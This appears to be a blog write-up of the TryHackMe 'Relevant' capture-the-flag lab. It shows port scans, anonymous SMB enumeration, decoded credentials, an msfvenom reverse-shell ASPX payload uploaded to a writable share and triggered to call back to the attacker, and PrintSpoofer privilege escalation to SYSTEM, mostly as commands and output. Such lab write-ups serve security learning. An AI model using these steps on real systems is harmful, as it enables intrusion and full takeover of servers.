---
layout: post
title:  "THM - Relevant"
image: /images/rele.jpg
---


## THM - Relevant

```bash
export ip=10.10.129.148
```

#### Port Scan

```bash
┌──(kali㉿Zeus)-[~]
└─$ sudo nmap -A -O -sS $ip 
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-10 23:22 EEST
Nmap scan report for 10.10.129.148 (10.10.129.148)
Host is up (0.11s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds       Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-09-10T20:24:15+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2021-09-09T19:41:03
|_Not valid after:  2022-03-11T19:41:03
|_ssl-date: 2021-09-10T20:24:54+00:00; 0s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2016 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-10T13:24:15-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-10T20:24:18
|_  start_date: 2021-09-10T19:41:39

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   83.81 ms  10.8.0.1 (10.8.0.1)
2   106.78 ms 10.10.129.148 (10.10.129.148)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.93 seconds

```

#### Port Scan - All Ports

```bash
┌──(kali㉿Zeus)-[~/Desktop]
└─$ nmap $ip -p-      
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-11 01:17 EEST
Nmap scan report for relevant (10.10.103.93)
Host is up (0.10s latency).
Not shown: 65527 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 450.16 seconds
```

#### SMB Client

```bash
┌──(kali㉿Zeus)-[~]
└─$ smbclient -L \\relevant -I $ip -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
SMB1 disabled -- no workgroup available
```

#### Enum Shares

```bash
┌──(kali㉿Zeus)-[~/Desktop]
└─$ smbclient \\\\relevant\\nt4wrksv
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jul 26 00:46:04 2020
  ..                                  D        0  Sun Jul 26 00:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 18:15:33 2020

                7735807 blocks of size 4096. 4949129 blocks available
smb: \> mget passwords.txt
Get file passwords.txt? y
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
                                                                         
┌──(kali㉿Zeus)-[~/Desktop]
└─$ cat passwords.txt 
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk                                     
```

#### Creds

```bash
┌──(kali㉿Zeus)-[~/Desktop]
└─$ cat base64.txt | base64 -d      
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$   
```

#### Web Access 

```bash
┌──(kali㉿Zeus)-[~/Desktop]
└─$ curl http://10.10.103.93:49663/nt4wrksv/passwords.txt                                                                                                  
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

###### Upload Reverse Shell

- [ASPX - Reverse Shell](https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx)

```bash
┌──(kali㉿Zeus)-[~/Desktop]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.28.219 LPORT=4444 -f aspx > reverse.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3411 bytes
                                                                                                                   
┌──(kali㉿Zeus)-[~/Desktop]
└─$ smbclient \\\\relevant\\nt4wrksv                                                             
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> put reverse.aspx
putting file reverse.aspx as \reverse.aspx (8.0 kb/s) (average 8.0 kb/s)
smb: \> exit
                                                                                                                   
┌──(kali㉿Zeus)-[~/Desktop]
└─$ curl http://10.10.103.93:49663/nt4wrksv/reverse.aspx
```

```bash
┌──(kali㉿Zeus)-[~]
└─$ nc -lnvp 4444 
listening on [any] 4444 ...
connect to [10.8.28.219] from (UNKNOWN) [10.10.103.93] 49881
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

#### Priv Esc

```bash
c:\Users>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

#### PrintSpoofer

```bash
┌──(kali㉿Zeus)-[~/Desktop]
└─$ smbclient \\\\relevant\\nt4wrksv
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> put PrintSpoofer.exe
putting file PrintSpoofer.exe as \PrintSpoofer.exe (47.1 kb/s) (average 47.1 kb/s)
smb: \>
```

#### Rooted

```bash
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

#### Resources

https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/

https://github.com/dievus/printspoofer